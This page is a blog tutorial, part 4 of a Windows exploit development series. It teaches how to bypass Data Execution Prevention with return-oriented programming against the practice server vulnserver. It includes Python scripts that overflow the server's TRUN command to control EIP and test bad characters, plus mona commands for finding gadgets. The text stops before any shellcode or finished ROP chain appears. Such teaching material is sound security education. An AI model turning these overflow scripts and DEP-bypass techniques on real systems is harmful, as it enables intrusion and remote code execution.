<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>Windows User Mode Exploit Development: Data Execution Prevention (DEP) Part 4 - memN0ps</title>
  <meta name="description" content="Please complete Windows User Mode Exploit Development Part 1, Windows User Mode Exploit Development SEH Part 2 and Windows User Mode Exploit Development Egghunter Part 3 before continuing so everything makes sense as some things will not be explained again :).
Please note, to understand exploit development thoroughly and adequately, you must have a strong understanding of both x86 (x32 bit) and x86_64 (x64 bit) assembly. Learning reverse engineering is one of the best ways to understand how things work, and it will help you when you&rsquo;re stuck and want to debug.">
  <meta name="author" content="memN0ps"/><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "memN0ps",
    
    "url": "https:\/\/memn0ps.github.io\/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "https:\/\/memn0ps.github.io\/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "https:\/\/memn0ps.github.io\/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "https:\/\/memn0ps.github.io\/Windows-User-Mode-Exploit-Development-DEP-Part-4\/",
          "name": "Windows user mode exploit development data execution prevention ( dep) part 4"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : "memN0ps"
  },
  "headline": "Windows User Mode Exploit Development: Data Execution Prevention (DEP) Part 4",
  "description" : "Please complete Windows User Mode Exploit Development Part 1, Windows User Mode Exploit Development SEH Part 2 and Windows User Mode Exploit Development Egghunter Part 3 before continuing so everything makes sense as some things will not be explained again :).\nPlease note, to understand exploit development thoroughly and adequately, you must have a strong understanding of both x86 (x32 bit) and x86_64 (x64 bit) assembly. Learning reverse engineering is one of the best ways to understand how things work, and it will help you when you\u0026rsquo;re stuck and want to debug.",
  "inLanguage" : "en",
  "wordCount":  3243 ,
  "datePublished" : "2020-10-12T00:00:00",
  "dateModified" : "2020-10-12T00:00:00",
  "image" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
  "keywords" : [ "" ],
  "mainEntityOfPage" : "https:\/\/memn0ps.github.io\/Windows-User-Mode-Exploit-Development-DEP-Part-4\/",
  "publisher" : {
    "@type": "Organization",
    "name" : "https:\/\/memn0ps.github.io\/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "https:\/\/memn0ps.github.io\/avatar-icon.jpg",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="Windows User Mode Exploit Development: Data Execution Prevention (DEP) Part 4" />
<meta property="og:description" content="Please complete Windows User Mode Exploit Development Part 1, Windows User Mode Exploit Development SEH Part 2 and Windows User Mode Exploit Development Egghunter Part 3 before continuing so everything makes sense as some things will not be explained again :).
Please note, to understand exploit development thoroughly and adequately, you must have a strong understanding of both x86 (x32 bit) and x86_64 (x64 bit) assembly. Learning reverse engineering is one of the best ways to understand how things work, and it will help you when you&rsquo;re stuck and want to debug.">
<meta property="og:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
<meta property="og:url" content="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-DEP-Part-4/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="memN0ps" />

  <meta name="twitter:title" content="Windows User Mode Exploit Development: Data Execution Prevention (DEP) …" />
  <meta name="twitter:description" content="Please complete Windows User Mode Exploit Development Part 1, Windows User Mode Exploit Development SEH Part 2 and Windows User Mode Exploit Development Egghunter Part 3 before continuing so …">
  <meta name="twitter:image" content="https://memn0ps.github.io/avatar-icon.jpg" />
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@memN0ps" />
  <meta name="twitter:creator" content="@memN0ps" />
  <link href='https://memn0ps.github.io/avatar-icon.jpg' rel='icon' type='image/x-icon'/>
  <meta name="generator" content="Hugo 0.93.1" />
  <link rel="alternate" href="https://memn0ps.github.io/index.xml" type="application/rss+xml" title="memN0ps"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://memn0ps.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://memn0ps.github.io/css/syntax.css" /><link rel="stylesheet" href="https://memn0ps.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="https://memn0ps.github.io/">memN0ps</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        

        

        
      </ul>
    </div>

    
      <div class="avatar-container">
        <div class="avatar-img-border">
          <a title="memN0ps" href="https://memn0ps.github.io/">
            <img class="avatar-img" src="https://memn0ps.github.io/avatar-icon.jpg" alt="memN0ps" />
          </a>
        </div>
      </div>
    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="post-heading">
              
                <h1>Windows User Mode Exploit Development: Data Execution Prevention (DEP) Part 4</h1>
              
              
              
              
                <span class="post-meta">
  
  
  <i class="fas fa-calendar"></i>&nbsp;Posted on October 12, 2020
  
  
  
  
    
      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;memN0ps
    
  
  
</span>


              
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>Please complete <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Part-1/">Windows User Mode Exploit Development Part 1</a>, <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-SEH-Part-2/">Windows User Mode Exploit Development SEH Part 2</a> and <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Egghunter-Part-3/">Windows User Mode Exploit Development Egghunter Part 3</a> before continuing so everything makes sense as some things will not be explained again :).</p>
<p>Please note, to understand exploit development thoroughly and adequately,  you must have a strong understanding of both x86 (x32 bit) and x86_64 (x64 bit) assembly. Learning reverse engineering is one of the best ways to understand how things work, and it will help you when you&rsquo;re stuck and want to debug. Debugging is very important. Without knowing reverse engineering/assembly, you may not get very far in exploit development.</p>
<p>Another thing to understand is, you should enjoy and love what you are doing or else I don&rsquo;t see a point. Nowadays, everyone is 1337 web hacker, but not everyone is an expert reverse engineer or exploit developer.</p>
<h2 id="what-is-a-buffer-overflow">What is a Buffer Overflow?</h2>
<p>A buffer overflow is when an application attempts to write more data in a buffer than expected or when an application attempts to write more data in a memory area past a buffer. A buffer is a sequential section of memory that is allocated to contain anything from strings to integers. Going past the memory area of the allocated block can crash the program, corrupt data and even execute malicious code.</p>
<h2 id="what-is-data-execution-prevention-dep">What is Data Execution Prevention (DEP)</h2>
<p>Data Execution Prevention (DEP) is a memory protection mechanism that prevents code from being executed in areas of memory used to store data such as the stack and heap. Data Execution Prevention (DEP) marks the pages of memory as non-executable (NX), preventing shellcode from being executed on the stack.</p>
<h2 id="return-oriented-programming-rop">Return Oriented Programming (ROP)</h2>
<p>Since we can&rsquo;t just drop shellcode on the stack like we usually do for a classic buffer overflow without any memory protection, we need to use something called Return Oriented Programming.</p>
<p>Return Oriented Programming is a technique used in exploit development to counter-memory protections such as Data Execution Prevention (DEP) by chaining together existing sequence of instructions or snippets of code within the program called gadgets, usually followed by a <code>RETN</code>. The <code>RETN</code> instruction will POP the return address from the stack back into the EIP register and redirect execution flow. We can use these instructions to return to another region in memory, rather than the intended area in memory, to execute a function or code of our choice, that makes the stack executable (<code>VirtualProtect()</code>).</p>
<p>When a function is called the caller places the arguments of the function on the stack then places the returns address on the stack (the next instruction to be executed right after the function is called). When a function has finished performing the intended tasks, it will call the <code>RET</code> instruction, which POPs the return address back into the EIP register to resume execution flow. We can hijack the execution flow to return to an existing function. In Linux, this function could be <code>system()</code> with the arguments <code>/bin/sh</code> (<code>ret2system</code>), which pops a shell or <code>mprotect()</code> <code>(ret2mprotect)</code>, which makes the stack executable. However, in Windows we have functions such as <code>VirtulAlloc(), HeapCreate(), SetProcessDEPPolicy(), NtSetInformationProcess(), VirtualProtect(), or WriteProtectMemory()</code> etc&hellip;</p>
<p>To conclude; A gadget is an existing sequence of assembly instructions or snippets of code within the program and using, multiple gadgets make up an ROP chain. For example, we will be using an existing Windows API function called <code>VirtualProtect()</code> to make stack from non-executable to executable, so we can place our shellcode on the stack and have it executed.</p>
<p>An example of a gadget was POP POP RET from the <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-SEH-Part-2/">Windows User Mode Exploit Development SEH Part 2</a> blog series.</p>
<h2 id="different-types-of-rop-gadgets">Different Types of ROP gadgets</h2>
<p>The following Windows API function can be used to bypass DEP on many version of Windows:</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/3a3c878d46794f48958dc0d3bde8c592.png" alt="71c70d7d8fb43b683c04b3d96981e66b.png">
<a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/">Diagram from Corelan</a></p>
<h2 id="virtualprotecthttpsdocsmicrosoftcomen-uswindowswin32apimemoryapinf-memoryapi-virtualprotect"><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect()</a></h2>
<p>We will be using VirtualProtect to make the stack executable then drop our shellcode on the stack to gain a reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C++" data-lang="C++"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="nf">VirtualProtect</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></div><p><strong>Parameters</strong></p>
<p><code>lpAddress</code></p>
<p>A pointer an address that describes the starting page of the region of pages whose access protection attributes are to be changed.</p>
<p>All pages in the specified region must be within the same reserved region allocated when calling the VirtualAlloc or VirtualAllocEx function using MEM_RESERVE. The pages cannot span adjacent reserved regions that were allocated by separate calls to VirtualAlloc or VirtualAllocEx using MEM_RESERVE.</p>
<p><code>dwSize</code></p>
<p>The size of the region whose access protection attributes are to be changed, in bytes. The region of affected pages includes all pages containing one or more bytes in the range from the lpAddress parameter to (lpAddress+dwSize). This means that a 2-byte range straddling a page boundary causes the protection attributes of both pages to be changed.</p>
<p><code>flNewProtect</code></p>
<p>The memory protection option. This parameter can be one of the memory protection constants.</p>
<p>For mapped views, this value must be compatible with the access protection specified when the view was mapped (see MapViewOfFile, MapViewOfFileEx, and MapViewOfFileExNuma).</p>
<p><code>lpflOldProtect</code></p>
<p>A pointer to a variable that receives the previous access protection value of the first page in the specified region of pages. If this parameter is NULL or does not point to a valid variable, the function fails.</p>
<h2 id="practical">Practical</h2>
<p>Firstly, we will have to make sure DEP is turned on for all programs and services.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/f74940d0fea34d31901cae081121b479.png" alt="52a7d33ccfa7774e79dcc5ec219a7eaf.png"></p>
<h2 id="controlling-eip">Controlling EIP</h2>
<p>As I explained in the <a href="https://memn0ps.github.io/Windows-User-Mode-Exploit-Development-Part-1/">Windows User Mode Exploit Development Part 1
</a></p>
<p>To control EIP, we need to find at which offset the EIP register is overwritten. We can use Metasploit’s pattern create to create a pattern of 3000 bytes and then locating the offset. Since the crash, a 3000 byte buffer crashes the program.</p>
<p>If you remember, we can now locate the offset, which is at 2003. This means that after 2003 bytes the EIP register the overwritten.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/3d2300c09b4442f9828f48ed6a6cba80.png" alt="EIP_Overwrite.png"></p>
<p>Here is the exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Target IP address and port</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.16.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2003</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span><span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;TRUN /.:/&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Evil buffer sent...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="locating-space-for-your-shellcode">Locating Space for Your Shellcode</h2>
<p>As shown in the previous screenshot, we can see that our ESP register point towards our C’s, which is more than enough space for our shellcode. A standard reverse shell takes anywhere between 350 to 400 bytes of space.</p>
<h2 id="checking-for-bad-characters">Checking for Bad Characters</h2>
<p>As I explained in part 1:</p>
<p>Depending on the application, vulnerability type and protocols in use, there may be certain characters that can truncate our buffer, which are considered to be bad chars.</p>
<p>An example of a very common bad character (especially in buffer overflows caused by unchecked string copy operations) is the null byte (0x00).</p>
<p>0x00 is considered a bad because a null byte is also used to terminate a string copy operation, which would effectively truncate our buffer to wherever the first null byte appears.</p>
<p>The reason we want to get rid of bad chars is that when we generate our reverse shell using msfvenom we can luckily say which char is a bad one and msfvenom will get rid of it.</p>
<p>We can use mona to generate a byte array from 00 to FF and send this payload in our exploit instead of our C’s. To demonstrate how the buffer is truncated I will include the bad char \x00</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/e4bf8752a5c245e4b28f82c2d2e1ae20.png" alt="ec26002934b1e6be93fd1713ac634e03.png"></p>
<p>Now, let’s remove \x00 and test for any other bad characters, this process can take sometime depending on the how many bad characters there are, trial and error is the only way as far as I’m aware.</p>
<p>As you can see, there are no more bad chars other than <code>\x00</code>.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/2179e60d7f4643e89616e6d7073d773f.png" alt="Badchars.png"></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Target IP address and port</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.16.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">badchars</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2003</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;B&#34;</span> <span class="o">*</span> <span class="mi">4</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">badchars</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;C&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span><span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;TRUN /.:/&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Evil buffer sent...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="redirecting-execution-flow">Redirecting Execution Flow</h2>
<p>As explained in part 1:</p>
<p>So we control the EIP register and have identified the bad characters, we can also see that ESP points to our C’s which is where we can place our shellcode for a reverse shell.</p>
<p>The best thing to do would be to try and replace the B’s that overwrite EIP with the address that pops up in the ESP register at the time of the crash. However, the value in the ESP register changes from crash to crash. This is why we can not hardcode the value.</p>
<p>The best way to go about this is to locate a reliable address in memory that contains an instruction such as JMP ESP. Then we can jump to it and end up at the address pointed to by the ESP register; the cool thing is we have mona.py which is an immunity debugger script to find this address for us.</p>
<p>We need to search for a module which meets the following criteria:</p>
<ul>
<li>Has no memory protections such as DEP or ASLR</li>
<li>Does not have any bad characters.</li>
</ul>
<p>Let’s run <code>!mona modules</code></p>
<p>We can instantly see there is a module that meets our criteria which is essfunc.dll. We also have vulnserver.exe but it is loaded at a very low address values, starting with 0x00, so any reference to addresses within vulnserver.exe will require a null byte, and that won’t work because ‘\x00’ is a bad character.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/26d178ded86a4457b5020d11b21f3639.png" alt="MonaModules.png"></p>
<p><code>!mona find -s &quot;\xff\xe4&quot; -m essfunc.dll</code></p>
<p>We can see that there are many occurrences of JMP ESP. However, we will just take the first one <code>0x625011AF</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/867bef77889741c5a9403de764fbaeb9.png" alt="essfunc.png"></p>
<p>Let&rsquo;s test this JMP ESP after placing a breakpoint on <code>0x625011AF</code>.</p>
<p>As you can see we hit our breakpoint, let&rsquo;s press F7 to take the jump.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/8e07b65cb9274c25a9ccd49c2dc6a651.png" alt="BreakPoint.png"></p>
<p>Well, guess what? Unlike part 1 we get an error <code>Access violation when executing...</code></p>
<p>This is because DEP is enabled and we tried to jump to a location on the stack to execute some instructions. This means we won&rsquo;t be able to place shellcode on the stack and execute it as the stack is marked non-executable.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/e1c434e97bf94a07910091000ef07988.png" alt="ErrorExecuting.png"></p>
<p>A closer look at the error.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/0c34dfc6b9754564b44656c092c729de.png" alt="ErrorExecuting1.png"></p>
<p>So, what do we do?</p>
<h2 id="enter-return-oriented-programming-rop">Enter Return Oriented Programming (ROP)</h2>
<p>Initially, we&rsquo;d have to locate a JMP ESP and use its address to overwrite EIP. This would allow EIP to execute JMP ESP and execute our shellcode on the stack. However, due to DEP, we won&rsquo;t be able to execute shellcode on the stack as it is marked non-executable. To bypass this, we have to use return-oriented programming (ROP).</p>
<p>In return-oriented programming, we find useful little snippets/pieces of code, called <code>gadgets</code> with just a few machine language instructions followed by a <code>RETN</code>, and chain (ROP chain) them together to perform something useful.</p>
<p>We can use existing Windows API functions to turn off DEP, or to allocate a region of memory with DEP turned off. We can use any of the following functions:</p>
<p><code>VirtulAlloc(), HeapCreate(), SetProcessDEPPolicy(), NtSetInformationProcess(), VirtualProtect(), or WriteProtectMemory()</code></p>
<p>We will be using VirtualProtect().</p>
<p>The process of chaining together these gadgets (machine language code) can still be very complicated. But, thanks to the authors of Mona, it makes this a lot easier.</p>
<h2 id="rop-chain">ROP Chain</h2>
<p>To build a ROP chain using Mona we can use the following command:</p>
<p><code>!mona rop -m *.dll -cp nonull</code></p>
<p>This will go through all the DLL with and generate chains of useful gadgets. Please note that this will take a few minutes. When the process is finished, you can click <code>View -&gt; Log</code>.</p>
